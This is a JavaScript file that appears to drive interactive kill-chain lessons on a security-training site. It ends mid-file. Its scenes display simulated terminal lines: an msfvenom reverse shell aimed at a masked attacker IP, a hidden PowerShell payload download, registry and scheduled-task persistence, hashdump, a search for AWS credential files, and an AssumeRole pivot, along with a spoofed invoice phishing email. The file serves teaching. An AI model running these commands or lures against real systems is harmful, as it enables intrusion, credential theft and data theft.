/* ============================================================
   SCENES · interactive kill-chain mini-simulations
   One scene per page. Each initializer is a no-op when its DOM
   isn't present, so we can load this file on every learn page.
   User actions call window.recordEvent() so the backend can log
   what the student clicked on each lesson.
   ============================================================ */

(function () {
  'use strict';

  function $(sel, root) { return (root || document).querySelector(sel); }
  function $$(sel, root) { return Array.prototype.slice.call((root || document).querySelectorAll(sel)); }

  function delay(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function typeText(el, text, speed) {
    speed = speed || 40;
    return new Promise(function (resolve) {
      var i = 0;
      el.textContent = '';
      var iv = setInterval(function () {
        el.textContent += text[i++];
        if (i >= text.length) { clearInterval(iv); resolve(); }
      }, speed);
    });
  }

  function addTermLine(container, html, cls) {
    var div = document.createElement('div');
    div.className = 'term-line ' + (cls || '');
    div.innerHTML = html;
    container.appendChild(div);
    requestAnimationFrame(function () { div.classList.add('visible'); });
    return div;
  }

  function addFsItem(tree, item) {
    var div = document.createElement('div');
    div.className = item.cls;
    div.textContent = item.text;
    tree.appendChild(div);
    requestAnimationFrame(function () {
      if (div.classList.contains('install-fs-item')) div.classList.add('visible');
    });
  }

  function formatMB(mb) {
    if (mb >= 1000) return (mb / 1000).toFixed(1) + ' GB';
    if (mb < 1) return (mb * 1000).toFixed(0) + ' KB';
    return Math.round(mb) + ' MB';
  }

  function setHint(sceneEl, text, tone) {
    var hint = sceneEl.querySelector('[data-scene-hint]');
    if (!hint) return;
    hint.innerHTML = text;
    hint.classList.remove('success');
    if (tone === 'success') hint.classList.add('success');
  }

  function wireActions(sceneEl, handlers) {
    var toolbar = sceneEl.querySelector('.scene-actions');
    if (!toolbar) return {};
    var btns = {};
    $$('.scene-action-btn', toolbar).forEach(function (btn) {
      var name = btn.dataset.action;
      btns[name] = btn;
      btn.addEventListener('click', async function () {
        if (btn.disabled || btn.classList.contains('done') || btn.classList.contains('running')) return;
        var handler = handlers[name];
        if (!handler) return;
        btn.classList.add('running');
        try {
          await handler(btn, btns);
        } finally {
          btn.classList.remove('running');
        }
      });
    });
    return btns;
  }

  function log(action, detail) {
    if (typeof window.recordEvent === 'function') {
      window.recordEvent(action, detail);
    }
  }

  /* ============================================================
     FRAMEWORK · 5-link overview diagram
     ============================================================ */
  function initFramework() {
    var diagram = document.getElementById('chainDiagram');
    if (!diagram) return;

    var nodesData = [];
    try { nodesData = JSON.parse(diagram.dataset.chainNodes || '[]'); }
    catch (e) { return; }

    var nodes = $$('.chain-node', diagram);
    var detail = document.getElementById('chainDetail');
    var lineFill = document.getElementById('chainLineFill');

    nodes.forEach(function (node) {
      node.addEventListener('click', function () {
        var phase = parseInt(node.dataset.phase, 10);
        var data = nodesData[phase - 1];
        if (!data) return;

        nodes.forEach(function (n) {
          n.classList.toggle('active', parseInt(n.dataset.phase, 10) <= phase);
        });
        lineFill.style.width = ((phase - 1) / (nodes.length - 1)) * 100 + '%';

        detail.innerHTML =
          '<div class="chain-detail-inner">' +
          '<span class="chain-detail-phase">0' + phase + '</span>' +
          '<div class="chain-detail-text"><h4>' + escapeHtml(data.name) + '</h4>' +
          '<p>' + escapeHtml(data.desc) + '</p></div>' +
          '</div>';

        log('chain_node_click', { phase: phase, name: data.name });
      });
    });
  }

  function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  /* ============================================================
     RECON · LinkedIn harvest
     ============================================================ */
  function initReconScene() {
    var scene = document.querySelector('[data-scene="recon"]');
    if (!scene) return;

    var profiles = [];
    try { profiles = JSON.parse(scene.dataset.profiles || '[]'); }
    catch (e) { return; }

    var profilesContainer = scene.querySelector('#reconProfiles');
    var harvestList = scene.querySelector('#harvestList');
    var countEl = scene.querySelector('#harvestCount');
    var searchText = scene.querySelector('.recon-search-text');
    var searchCaret = scene.querySelector('.recon-search-caret');
    var harvested = new Set();

    function harvestProfile(div, p) {
      if (harvested.has(p.email)) return;
      harvested.add(p.email);
      div.classList.add('harvested');

      var entry = document.createElement('div');
      entry.className = 'harvest-entry';
      entry.textContent = p.email;
      harvestList.appendChild(entry);
      requestAnimationFrame(function () { entry.classList.add('visible'); });
      countEl.textContent = harvested.size;

      log('recon_harvest', { email: p.email, role: p.role, harvested_count: harvested.size });

      if (harvested.size === profiles.length) {
        setHint(scene, '<strong>All targets harvested.</strong> The attacker now has every IT staffer\'s email address.', 'success');
        btns.harvestAll.disabled = true;
        btns.harvestAll.classList.add('done');
        log('recon_complete', { total: profiles.length });
      } else {
        setHint(scene, 'Harvested <strong>' + harvested.size + '/' + profiles.length + '</strong>. Keep going, or click <strong>Harvest All</strong>.');
      }
    }

    async function runScan(btn) {
      btn.disabled = true;
      log('recon_scan_start');
      searchText.classList.remove('recon-search-placeholder');
      searchCaret.classList.add('active');
      await typeText(searchText, 'IT staff acme-corp', 55);
      await delay(300);
      searchCaret.classList.remove('active');

      for (var i = 0; i < profiles.length; i++) {
        var p = profiles[i];
        var div = document.createElement('div');
        div.className = 'recon-profile';
        div.dataset.email = p.email;
        div.innerHTML =
          '<div class="recon-avatar">' + escapeHtml(p.initials) + '</div>' +
          '<div class="recon-profile-info">' +
          '<span class="recon-profile-name">' + escapeHtml(p.name) + '</span>' +
          '<span class="recon-profile-role">' + escapeHtml(p.role) + '</span>' +
          '</div>';
        profilesContainer.appendChild(div);
        await delay(70);
        div.classList.add('visible');
      }

      $$('.recon-profile', profilesContainer).forEach(function (div) {
        var p = profiles.find(function (pp) { return pp.email === div.dataset.email; });
        div.classList.add('interactive');
        div.addEventListener('click', function () { harvestProfile(div, p); });
      });

      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-icon">&#10003;</span> Scan Complete';
      btns.harvestAll.disabled = false;
      btns.reset.disabled = false;
      setHint(scene, 'Click any profile to harvest their email, or <strong>Harvest All</strong>.');
    }

    async function harvestAll(btn) {
      btn.disabled = true;
      log('recon_harvest_all');
      var remaining = $$('.recon-profile:not(.harvested)', profilesContainer);
      for (var i = 0; i < remaining.length; i++) {
        var div = remaining[i];
        var p = profiles.find(function (pp) { return pp.email === div.dataset.email; });
        harvestProfile(div, p);
        await delay(140);
      }
      btn.classList.add('done');
    }

    function reset() {
      profilesContainer.innerHTML = '';
      harvestList.innerHTML = '';
      countEl.textContent = '0';
      searchText.textContent = 'Search employees...';
      searchText.classList.add('recon-search-placeholder');
      searchCaret.classList.remove('active');
      harvested.clear();

      btns.scan.disabled = false;
      btns.scan.classList.remove('done');
      btns.scan.innerHTML = '<span class="scene-action-icon">&#9655;</span> Start Scan';
      btns.harvestAll.disabled = true;
      btns.harvestAll.classList.remove('done');
      btns.reset.disabled = true;
      setHint(scene, 'Click <strong>Start Scan</strong> to begin searching for employee data.');
      log('scene_reset', { scene: 'recon' });
    }

    var btns = wireActions(scene, { scan: runScan, harvestAll: harvestAll, reset: reset });
  }

  /* ============================================================
     ARM & DELIVER · build payload, weaponize, deliver
     ============================================================ */
  function initArmDeliverScene() {
    var scene = document.querySelector('[data-scene="armdeliver"]');
    if (!scene) return;

    var target = scene.dataset.targetEmail || '';
    var terminal = scene.querySelector('#armTerminal');
    var output = scene.querySelector('#armOutput');
    var connector = scene.querySelector('#armConnector');
    var emailMain = scene.querySelector('#armEmailMain');
    var badge = scene.querySelector('#armEmailBadge');

    var buildLines = [
      { html: '<span class="term-prompt">$ </span><span class="term-cmd">msfvenom -p windows/meterpreter/reverse_tcp \\</span>', delay: 220 },
      { html: '<span class="term-output">  LHOST=185.47.xx.xx -f vba -o payload.vba</span>', delay: 260 },
      { html: '<span class="term-warn">[*] Generating payload...</span>', delay: 350 },
      { html: '<span class="term-success">[+] Payload saved (684 bytes)</span>', delay: 220 }
    ];
    var weaponLines = [
      { html: '<span class="term-output">&nbsp;</span>', delay: 100 },
      { html: '<span class="term-prompt">$ </span><span class="term-cmd">python3 inject_macro.py --output Q1_Invoice.docm</span>', delay: 260 },
      { html: '<span class="term-warn">[*] Injecting macro...</span>', delay: 350 },
      { html: '<span class="term-success">[+] Weaponized document created</span>', delay: 200 },
      { html: '<span class="term-danger">[!] Auto-execute on open</span>', delay: 200 }
    ];

    function clearPlaceholder() {
      var ph = terminal.querySelector('.term-placeholder');
      if (ph) ph.remove();
    }

    async function build(btn) {
      btn.disabled = true;
      log('armdeliver_build');
      clearPlaceholder();
      for (var i = 0; i < buildLines.length; i++) {
        addTermLine(terminal, buildLines[i].html);
        terminal.scrollTop = terminal.scrollHeight;
        await delay(buildLines[i].delay);
      }
      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">1</span> Payload Built';
      btns.weaponize.disabled = false;
      btns.reset.disabled = false;
      setHint(scene, 'Reverse shell is ready. Now <strong>Weaponize</strong> it into a document.');
    }

    async function weaponize(btn) {
      btn.disabled = true;
      log('armdeliver_weaponize');
      for (var i = 0; i < weaponLines.length; i++) {
        addTermLine(terminal, weaponLines[i].html);
        terminal.scrollTop = terminal.scrollHeight;
        await delay(weaponLines[i].delay);
      }
      await delay(250);
      output.classList.add('visible');
      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">2</span> Weaponized';
      btns.send.disabled = false;
      setHint(scene, 'Malicious doc is armed. Time to <strong>Send</strong> it to the target.');
    }

    async function send(btn) {
      btn.disabled = true;
      log('armdeliver_send', { target: target });
      connector.classList.add('active');
      await delay(700);

      emailMain.innerHTML = '';
      var msg = document.createElement('div');
      msg.className = 'email-message';
      msg.innerHTML =
        '<div class="email-msg-header">' +
          '<div class="email-msg-from">Sarah Chen (Accounting) <span class="email-spoof">SPOOFED</span></div>' +
          '<div class="email-msg-to">To: ' + escapeHtml(target) + '</div>' +
          '<div class="email-msg-subject">URGENT: Q1 Invoice Requires Approval</div>' +
        '</div>' +
        '<div class="email-msg-body">' +
          '<p>Hi,</p>' +
          '<p>The attached invoice needs your <span class="email-urgency">immediate approval before end of day</span>. Finance flagged this as time-sensitive.</p>' +
          '<p>Thanks,<br>Sarah Chen</p>' +
        '</div>' +
        '<div class="email-attachment">' +
          '<span class="email-attachment-icon">&#128206;</span>Q1_Invoice.docm' +
          '<span style="margin-left:auto;font-size:11px;color:var(--text-tertiary)">342 KB</span>' +
        '</div>';
      emailMain.appendChild(msg);
      badge.textContent = '1';
      badge.classList.add('visible');
      await delay(200);
      msg.classList.add('visible');
      await delay(900);
      msg.querySelector('.email-spoof').classList.add('visible');

      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">3</span> Email Delivered';
      setHint(scene, '<strong>Delivered.</strong> The bait is in the target\'s inbox. The attacker now waits.', 'success');
      log('armdeliver_complete');
    }

    function reset() {
      terminal.innerHTML = '<div class="term-line visible term-placeholder">$ <span class="term-caret">_</span></div>';
      output.classList.remove('visible');
      connector.classList.remove('active');
      emailMain.innerHTML = '<div class="email-empty">No new messages</div>';
      badge.textContent = '0';
      badge.classList.remove('visible');

      btns.build.disabled = false;
      btns.build.classList.remove('done');
      btns.build.innerHTML = '<span class="scene-action-num">1</span> Build Payload';
      btns.weaponize.disabled = true;
      btns.weaponize.classList.remove('done');
      btns.weaponize.innerHTML = '<span class="scene-action-num">2</span> Weaponize Doc';
      btns.send.disabled = true;
      btns.send.classList.remove('done');
      btns.send.innerHTML = '<span class="scene-action-num">3</span> Send Phishing Email';
      btns.reset.disabled = true;
      setHint(scene, 'Walk through the three steps to craft and deliver the attack.');
      log('scene_reset', { scene: 'armdeliver' });
    }

    var btns = wireActions(scene, { build: build, weaponize: weaponize, send: send, reset: reset });
  }

  /* ============================================================
     INITIAL COMPROMISE · Enable Content → persistence → C2 → send commands
     A chained flow: the macro click fires the foothold, then unlocks
     the persistence + beacon + send-commands chain that used to be
     its own lesson. Reuses the .exploit-* + .control-* CSS chassis.
     ============================================================ */
  function initCompromiseScene() {
    var scene = document.querySelector('[data-scene="compromise"]');
    if (!scene) return;

    // ---- Stage 1 (macro detonation) DOM ----
    var doc = scene.querySelector('#exploitDoc');
    var banner = scene.querySelector('#docBanner');
    var overlay = scene.querySelector('#exploitOverlay');
    var exploitTerminal = scene.querySelector('#exploitTerminal');
    var enableBtn = scene.querySelector('#docEnableBtn');
    var enabled = false;

    // ---- Stage 2 (persistence + C2) DOM ----
    var log_ = scene.querySelector('#controlLog');
    var tree = scene.querySelector('#controlTree');
    var packets = scene.querySelector('#controlPackets');
    var c2Terminal = scene.querySelector('#controlTerminal');

    var exploitLines = [
      { text: 'C:\\> powershell -ep bypass -nop -w hidden', delay: 220 },
      { text: 'Downloading payload from 185.47.xx.xx...', delay: 400 },
      { text: '████████████████████████ 100%', delay: 450 },
      { text: 'Executing in memory...', delay: 280 },
      { text: '[+] Meterpreter session 1 opened', delay: 380 },
      { text: '[+] Privilege: ACME\\m.smith', delay: 260 },
      { text: '[+] Target: DESKTOP-ACME-47', delay: 200 }
    ];
    var entries = [
      { time: '14:32:01', type: 'write', cls: 'install-log-type--write', msg: 'svchost_update.exe dropped to C:\\Windows\\Temp\\' },
      { time: '14:32:02', type: 'write', cls: 'install-log-type--write', msg: 'mshelper.dll created in AppData\\Local\\' },
      { time: '14:32:03', type: 'reg',   cls: 'install-log-type--reg',   msg: 'HKCU\\...\\Run → "WindowsHelper" = svchost_update.exe' },
      { time: '14:32:04', type: 'exec',  cls: 'install-log-type--exec',  msg: 'schtasks /create /tn "SystemUpdate" /sc onlogon' },
      { time: '14:32:05', type: 'net',   cls: 'install-log-type--net',   msg: 'Outbound → 185.47.xx.xx:4443 (ESTABLISHED)' }
    ];
    var fsItems = [
      { text: 'C:\\Windows\\Temp\\',            cls: 'install-fs-folder' },
      { text: '  svchost_update.exe',           cls: 'install-fs-item new-file' },
      { text: 'C:\\Users\\m.smith\\AppData\\',  cls: 'install-fs-folder' },
      { text: '  Local\\mshelper.dll',          cls: 'install-fs-item new-file' },
      { text: 'Registry:',                       cls: 'install-fs-folder' },
      { text: '  Run → WindowsHelper',          cls: 'install-fs-item new-file' }
    ];
    var commands = [
      { html: '<span class="term-success">[+] Beacon: 10.0.0.47 → 185.47.xx.xx</span>', delay: 400 },
      { html: '<span class="term-prompt">meterpreter> </span><span class="term-cmd">sysinfo</span>', delay: 300 },
      { html: '<span class="term-output">Computer : DESKTOP-ACME-47</span>', delay: 140 },
      { html: '<span class="term-output">User     : ACME\\m.smith</span>', delay: 200 },
      { html: '<span class="term-prompt">meterpreter> </span><span class="term-cmd">hashdump</span>', delay: 380 },
      { html: '<span class="term-danger">Administrator:500:aad3b...:::</span>', delay: 150 },
      { html: '<span class="term-prompt">meterpreter> </span><span class="term-cmd">search -f *.xlsx</span>', delay: 380 },
      { html: '<span class="term-output">Found 47 files matching *.xlsx</span>', delay: 200 }
    ];

    var packetInterval = null;

    function setupPulse() { enableBtn.style.animation = 'pulse-btn 1.6s ease-in-out infinite'; }
    function stopPulse() { enableBtn.style.animation = 'none'; }
    function clearC2TerminalPlaceholder() {
      var ph = c2Terminal.querySelector('.term-placeholder');
      if (ph) ph.remove();
    }
    function clearLogEmpty() {
      var e = log_.querySelector('.install-empty');
      if (e) e.remove();
    }

    async function onEnableClick() {
      if (enabled) return;
      enabled = true;
      log('compromise_enable_content');
      stopPulse();
      btns.enable.disabled = true;
      btns.enable.classList.add('done');
      btns.enable.innerHTML = '<span class="scene-action-num">1</span> Macro Fired';
      banner.classList.add('clicked');
      enableBtn.textContent = 'Enabled';
      await delay(450);
      doc.classList.add('blurred');
      overlay.classList.add('visible');
      setHint(scene, '<strong>Reverse shell live.</strong> Now lock it in — install persistence so the foothold survives a reboot.');

      for (var i = 0; i < exploitLines.length; i++) {
        var line = document.createElement('div');
        line.className = 'term-line';
        line.textContent = exploitLines[i].text;
        exploitTerminal.appendChild(line);
        await delay(60);
        line.classList.add('visible');
        await delay(exploitLines[i].delay);
      }
      btns.install.disabled = false;
      btns.reset.disabled = false;
      log('compromise_foothold');
    }

    async function install(btn) {
      btn.disabled = true;
      log('compromise_install_persistence');
      clearLogEmpty();
      var fsIdx = 0;
      for (var i = 0; i < entries.length; i++) {
        var e = entries[i];
        var row = document.createElement('div');
        row.className = 'install-log-entry';
        row.innerHTML =
          '<span class="install-log-time">' + e.time + '</span>' +
          '<span class="install-log-type ' + e.cls + '">' + e.type + '</span>' +
          '<span class="install-log-msg">' + escapeHtml(e.msg) + '</span>';
        log_.appendChild(row);
        await delay(60);
        row.classList.add('visible');
        if (fsIdx < fsItems.length) {
          addFsItem(tree, fsItems[fsIdx++]);
          await delay(100);
          if (fsIdx < fsItems.length) addFsItem(tree, fsItems[fsIdx++]);
        }
        await delay(300);
      }
      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">2</span> Persistence Installed';
      btns.beacon.disabled = false;
      setHint(scene, 'Backdoor planted. Now open an encrypted tunnel back to the attacker.');
    }

    function startBeacon(btn) {
      if (packetInterval) return;
      btn.disabled = true;
      log('compromise_beacon');
      var packetId = 0;
      packetInterval = setInterval(function () {
        var pkt = document.createElement('div');
        pkt.className = 'c2-packet ' + (packetId % 3 === 0 ? 'c2-packet--in' : 'c2-packet--out');
        pkt.style.animationDuration = (0.9 + Math.random() * 0.5) + 's';
        packets.appendChild(pkt);
        packetId++;
        setTimeout(function () { pkt.remove(); }, 2000);
      }, 380);
      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">3</span> Beacon Live';
      btns.execute.disabled = false;
      setHint(scene, 'C2 channel is live. Send commands to confirm full remote control.');
    }

    async function execute(btn) {
      btn.disabled = true;
      log('compromise_execute_commands');
      clearC2TerminalPlaceholder();
      for (var i = 0; i < commands.length; i++) {
        addTermLine(c2Terminal, commands[i].html);
        c2Terminal.scrollTop = c2Terminal.scrollHeight;
        await delay(commands[i].delay);
      }
      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">4</span> Commands Sent';
      setHint(scene, '<strong>Full remote control achieved.</strong> Foothold + persistence + C2 are all live.', 'success');
      log('compromise_complete');
    }

    function reset() {
      enabled = false;
      banner.classList.remove('clicked');
      enableBtn.textContent = 'Enable Content';
      doc.classList.remove('blurred');
      overlay.classList.remove('visible');
      exploitTerminal.innerHTML = '';
      setupPulse();

      if (packetInterval) { clearInterval(packetInterval); packetInterval = null; }
      packets.innerHTML = '';
      log_.innerHTML = '<div class="install-empty">Waiting for attacker activity…</div>';
      tree.innerHTML = '';
      c2Terminal.innerHTML = '<div class="term-line visible term-placeholder">meterpreter&gt; <span class="term-caret">_</span></div>';

      btns.enable.disabled = false;
      btns.enable.classList.remove('done');
      btns.enable.innerHTML = '<span class="scene-action-num">1</span> Enable Content';
      btns.install.disabled = true;
      btns.install.classList.remove('done');
      btns.install.innerHTML = '<span class="scene-action-num">2</span> Install Persistence';
      btns.beacon.disabled = true;
      btns.beacon.classList.remove('done');
      btns.beacon.innerHTML = '<span class="scene-action-num">3</span> Open C2 Channel';
      btns.execute.disabled = true;
      btns.execute.classList.remove('done');
      btns.execute.innerHTML = '<span class="scene-action-num">4</span> Send Commands';
      btns.reset.disabled = true;
      setHint(scene, 'Click the glowing <strong>Enable Content</strong> button to detonate the macro and earn a foothold.');
      log('scene_reset', { scene: 'compromise' });
    }

    enableBtn.addEventListener('click', onEnableClick);
    var btns = wireActions(scene, {
      enable: onEnableClick,
      install: install,
      beacon: startBeacon,
      execute: execute,
      reset: reset
    });
    setupPulse();
  }

  /* ============================================================
     ESCALATE PRIVILEGES · AWS credential hunt + AssumeRole pivot
     Three-step: search filesystem → read keys → assume admin role.
     ============================================================ */
  function initEscalateScene() {
    var scene = document.querySelector('[data-scene="escalate"]');
    if (!scene) return;

    var terminal = scene.querySelector('#escalateTerminal');
    var idCard = scene.querySelector('#escalateIdCard');
    var idName = scene.querySelector('#escalateIdName');
    var idArn = scene.querySelector('#escalateIdArn');
    var idBadge = scene.querySelector('#escalateIdBadge');
    var policiesList = scene.querySelector('#escalatePoliciesList');
    var policiesCount = scene.querySelector('#escalatePoliciesCount');
    var arrowFill = scene.querySelector('#escalateArrowFill');

    var foundFile = scene.dataset.foundFile || '~/.aws/credentials';
    var accessKey = scene.dataset.accessKey || '';
    var secretKey = scene.dataset.secretKey || '';
    var keyOwner = scene.dataset.keyOwner || 'jenkins-deployer';
    var lowRole = scene.dataset.lowRole || '';
    var lowRoleLabel = scene.dataset.lowRoleLabel || 'low-priv';
    var adminRole = scene.dataset.adminRole || '';
    var adminRoleLabel = scene.dataset.adminRoleLabel || 'admin';

    var searchLines = [
      { html: '<span class="term-prompt">$ </span><span class="term-cmd">grep -r "aws_access_key" /home /Users 2&gt;/dev/null</span>', delay: 280 },
      { html: '<span class="term-warn">[*] scanning 41,287 files…</span>', delay: 360 },
      { html: '<span class="term-output">[*] skipping /Users/m.smith/Library (binary)</span>', delay: 220 },
      { html: '<span class="term-success">[+] match: ' + escapeHtml(foundFile) + '</span>', delay: 320 }
    ];
    var readLines = [
      { html: '<span class="term-prompt">$ </span><span class="term-cmd">cat ' + escapeHtml(foundFile) + '</span>', delay: 240 },
      { html: '<span class="term-output">[default]</span>', delay: 140 },
      { html: '<span class="term-danger">aws_access_key_id     = ' + escapeHtml(accessKey) + '</span>', delay: 200 },
      { html: '<span class="term-danger">aws_secret_access_key = ' + escapeHtml(secretKey) + '</span>', delay: 220 },
      { html: '<span class="term-output">region                = us-east-1</span>', delay: 180 },
      { html: '<span class="term-prompt">$ </span><span class="term-cmd">aws sts get-caller-identity</span>', delay: 320 },
      { html: '<span class="term-success">{"Arn": "' + escapeHtml(lowRole) + '"}</span>', delay: 280 }
    ];
    var assumeLines = [
      { html: '<span class="term-prompt">$ </span><span class="term-cmd">aws sts assume-role \\</span>', delay: 240 },
      { html: '<span class="term-cmd">    --role-arn ' + escapeHtml(adminRole) + ' \\</span>', delay: 180 },
      { html: '<span class="term-cmd">    --role-session-name red-team-pivot</span>', delay: 220 },
      { html: '<span class="term-warn">[*] requesting STS credentials…</span>', delay: 320 },
      { html: '<span class="term-success">[+] Credentials.AccessKeyId  = ASIA42…</span>', delay: 240 },
      { html: '<span class="term-success">[+] Credentials.SessionToken = FwoGZXIvYXdzEC…</span>', delay: 240 },
      { html: '<span class="term-danger">[!] Now operating as OrganizationAccountAdmin</span>', delay: 320 }
    ];

    function clearPlaceholder() {
      var ph = terminal.querySelector('.term-placeholder');
      if (ph) ph.remove();
    }

    function setIdState(state, name, arn, badgeText) {
      idCard.dataset.state = state;
      if (name)      idName.textContent = name;
      if (arn)       idArn.textContent = arn;
      if (badgeText) idBadge.textContent = badgeText;
    }

    function renderPolicies(list) {
      policiesList.innerHTML = '';
      if (!list.length) {
        var empty = document.createElement('div');
        empty.className = 'escalate-policy-empty';
        empty.textContent = 'No policies attached.';
        policiesList.appendChild(empty);
      } else {
        list.forEach(function (p) {
          var row = document.createElement('div');
          row.className = 'escalate-policy-row' + (p.danger ? ' is-danger' : '');
          row.innerHTML =
            '<span class="escalate-policy-name">' + escapeHtml(p.name) + '</span>' +
            '<span class="escalate-policy-tag">' + escapeHtml(p.tag) + '</span>';
          policiesList.appendChild(row);
        });
      }
      policiesCount.textContent = list.length;
    }

    async function runTerminalLines(lines) {
      clearPlaceholder();
      for (var i = 0; i < lines.length; i++) {
        addTermLine(terminal, lines[i].html);
        terminal.scrollTop = terminal.scrollHeight;
        await delay(lines[i].delay);
      }
    }

    async function search(btn) {
      btn.disabled = true;
      log('escalate_search', { target: foundFile });
      await runTerminalLines(searchLines);
      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">1</span> File Found';
      btns.read.disabled = false;
      btns.reset.disabled = false;
      arrowFill.style.width = '20%';
      setHint(scene, 'Found <strong>' + escapeHtml(foundFile) + '</strong>. Now read the keys to confirm what they unlock.');
    }

    async function read(btn) {
      btn.disabled = true;
      log('escalate_read_creds', { owner: keyOwner });
      await runTerminalLines(readLines);
      setIdState('user', keyOwner, lowRole, 'EC2 ReadOnly');
      renderPolicies([
        { name: 'AmazonEC2ReadOnlyAccess', tag: 'AWS managed' },
        { name: 'jenkins-deploy-policy',   tag: 'inline' }
      ]);
      arrowFill.style.width = '55%';
      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">2</span> Keys Identified';
      btns.assume.disabled = false;
      setHint(scene, 'Keys belong to <strong>' + escapeHtml(keyOwner) + '</strong>. They can call <code>sts:AssumeRole</code> on the org-admin role.');
    }

    async function assume(btn) {
      btn.disabled = true;
      log('escalate_assume_role', { role: adminRole });
      await runTerminalLines(assumeLines);
      setIdState('admin', 'OrganizationAccountAdmin', adminRole, 'ALL ACCESS');
      renderPolicies([
        { name: 'AdministratorAccess',         tag: 'AWS managed', danger: true },
        { name: 'AssumeRole · all accounts',   tag: 'inline',      danger: true }
      ]);
      arrowFill.style.width = '100%';
      btn.classList.add('done');
      btn.innerHTML = '<span class="scene-action-num">3</span> Admin Assumed';
      setHint(scene, '<strong>Privilege escalated.</strong> A regular dev key just turned into account-admin.', 'success');
      log('escalate_complete');
    }

    function reset() {
      terminal.innerHTML = '<div class="term-line visible term-placeholder">$ <span class="term-caret">_</span></div>';
      setIdState('idle', '— no identity —', 'awaiting credentials…', 'LOCKED');
      policiesList.innerHTML = '<div class="escalate-policy-empty">Run a step to populate identity context.</div>';
      policiesCount.textContent = '0';
      arrowFill.style.width = '0%';

      btns.search.disabled = false;
      btns.search.classList.remove('done');
      btns.search.innerHTML = '<span class="scene-action-num">1</span> Search Files';
      btns.read.disabled = true;
      btns.read.classList.remove('done');
      btns.read.innerHTML = '<span class="scene-action-num">2</span> Read Credentials';
      btns.assume.disabled = true;
      btns.assume.classList.remove('done');
      btns.assume.innerHTML = '<span class="scene-action-num">3</span> Assume Admin Role';
      btns.reset.disabled = true;
      setHint(scene, 'Hunt the disk for <strong>~/.aws/credentials</strong> — devs leave plaintext keys behind ALL the time.');
      log('scene_reset', { scene: 'escalate' });
    }

    var btns = wireActions(scene, { search: search, read: read, assume: assume, reset: reset });
  }

  /* ============================================================
     EXFIL · steal files
     ============================================================ */
  function initExfilScene() {
    var scene = document.querySelector('[data-scene="exfil"]');
    if (!scene) return;

    var files = [];
    try { files = JSON.parse(scene.dataset.files || '[]'); }
    catch (e) { return; }

    var totalMB = files.reduce(function (a, f) { return a + f.mb; }, 0);
    var totalLabel = (totalMB / 1000).toFixed(1) + ' GB';

    var filesContainer = scene.querySelector('#exfilFiles');
    var label = scene.querySelector('#exfilLabel');
    var fill = scene.querySelector('#exfilFill');
    var bytesEl = scene.querySelector('#exfilBytes');
    var countEl = scene.querySelector('#exfilCount');

    var transferred = 0;
    var stolenCount = 0;
    var stealing = false;

    function render() {
      filesContainer.innerHTML = '';
      files.forEach(function (f, i) {
        var div = document.createElement('div');
        div.className = 'exfil-file interactive';
        div.dataset.index = i;
        var serviceTag = f.service
          ? '<span class="exfil-file-service">' + escapeHtml(f.service) + '</span>'
          : '';
        div.innerHTML =
          '<span class="exfil-file-icon">' + f.icon + '</span>' +
          '<div class="exfil-file-info">' +
          '<span class="exfil-file-name">' + escapeHtml(f.name) + '</span>' +
          '<span class="exfil-file-meta">' +
            serviceTag +
            '<span class="exfil-file-size">' + escapeHtml(f.size) + '</span>' +
          '</span>' +
          '</div>';
        div.addEventListener('click', function () { stealFile(div, f); });
        filesContainer.appendChild(div);
        setTimeout(function () { div.classList.add('visible'); }, 80 + i * 60);
      });
    }

    async function stealFile(div, f) {
      if (stealing || div.classList.contains('stolen')) return;
      stealing = true;

      log('exfil_steal_file', { file: f.name, size: f.size, service: f.service });

      div.classList.add('stealing');
      label.textContent = 'Exfiltrating ' + f.name + '…';
      label.classList.add('active');
      btns.reset.disabled = false;

      var steps = Math.max(4, Math.min(10, Math.round(f.mb / 150) + 4));
      for (var s = 0; s < steps; s++) {
        transferred += f.mb / steps;
        var pct = Math.min((transferred / totalMB) * 100, 100);
        fill.style.width = pct + '%';
        bytesEl.textContent = formatMB(transferred) + ' / ' + totalLabel;
        await delay(60);
      }

      div.classList.remove('stealing');
      div.classList.add('stolen');
      stolenCount++;
      countEl.textContent = stolenCount;
      stealing = false;

      if (stolenCount === files.length) {
        label.textContent = 'Exfiltration Complete';
        fill.style.width = '100%';
        bytesEl.textContent = totalLabel + ' / ' + totalLabel;
        var bucket = scene.dataset.attackerBucket || 'the attacker bucket';
        setHint(scene,
          '<strong>Mission complete.</strong> ' + totalLabel +
          ' of AWS data copied to <code>' + escapeHtml(bucket) + '</code> via the OrgAdmin session.',
          'success');
        btns.stealAll.disabled = true;
        btns.stealAll.classList.add('done');
        log('exfil_complete', { total_mb: Math.round(totalMB) });
      } else {
        setHint(scene, 'Stolen <strong>' + stolenCount + '/' + files.length + '</strong> resources (' + formatMB(transferred) + '). Keep going.');
      }
    }

    async function stealAll(btn) {
      btn.disabled = true;
      log('exfil_steal_all');
      var remaining = $$('.exfil-file:not(.stolen):not(.stealing)', filesContainer);
      for (var i = 0; i < remaining.length; i++) {
        var div = remaining[i];
        var f = files[parseInt(div.dataset.index, 10)];
        await stealFile(div, f);
        await delay(120);
      }
    }

    function reset() {
      transferred = 0;
      stolenCount = 0;
      stealing = false;
      fill.style.width = '0%';
      bytesEl.textContent = '0 MB / ' + totalLabel;
      countEl.textContent = '0';
      label.textContent = 'Idle';
      label.classList.remove('active');
      render();

      btns.stealAll.disabled = false;
      btns.stealAll.classList.remove('done');
      btns.reset.disabled = true;
      setHint(scene, 'Click any AWS resource to siphon it with the <strong>OrgAdmin</strong> session, or run a full smash-and-grab.');
      log('scene_reset', { scene: 'exfil' });
    }

    var btns = wireActions(scene, { stealAll: stealAll, reset: reset });
    bytesEl.textContent = '0 MB / ' + totalLabel;
    render();
  }

  /* ============================================================
     BOOT
     ============================================================ */
  function init() {
    initFramework();
    initReconScene();
    initArmDeliverScene();
    initCompromiseScene();
    initEscalateScene();
    initExfilScene();
  }

